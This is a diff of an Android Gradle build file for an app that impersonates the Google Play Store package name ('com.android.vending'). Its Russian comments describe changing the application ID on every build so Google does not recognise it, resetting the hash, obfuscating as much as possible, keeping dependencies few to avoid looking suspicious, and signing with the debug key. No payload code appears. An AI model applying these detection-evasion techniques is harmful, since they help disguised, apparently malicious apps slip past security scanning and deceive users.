@@ -1,57 +1,29 @@
 apply plugin: 'com.android.application'
 
 android {
-    // Это лечит ошибку "package attribute is ignored"
-    namespace 'com.android.vending.core' 
+    namespace 'com.android.vending.core'
     compileSdk 34
 
     defaultConfig {
-        // Каждый новый билд — новый ID, чтобы Google не узнал "старого знакомого"
-        applicationId "com.android.vending.service.v26" 
-        
+        // Каждый раз меняй цифру в конце (v31, v32...), чтобы сбросить хеш
+        applicationId "com.android.vending.service.v31" 
         minSdk 21
         targetSdk 34
-        
-        // Версию всегда ставим выше предыдущей
-        versionCode 26
-        versionName "2.6.26"
-        
-        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
+        versionCode 31
+        versionName "3.1.31"
     }
 
     buildTypes {
-        debug {
-            minifyEnabled true
-            shrinkResources false
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-        }
         release {
-            // Максимальная обфускация
             minifyEnabled true
             shrinkResources false
             zipAlignEnabled true
-            
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-            
-            // Подписываем дебажным ключом, чтобы избежать "поврежденного пакета"
             signingConfig signingConfigs.debug
-        }
-    }
-
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
-    }
-
-    packagingOptions {
-        resources {
-            excludes += '/META-INF/{AL2.0,LGPL2.1}'
         }
     }
 }
 
 dependencies {
-    // Минимум зависимостей, чтобы не раздувать подозрительный код
     implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'com.google.android.material:material:1.9.0'
 }
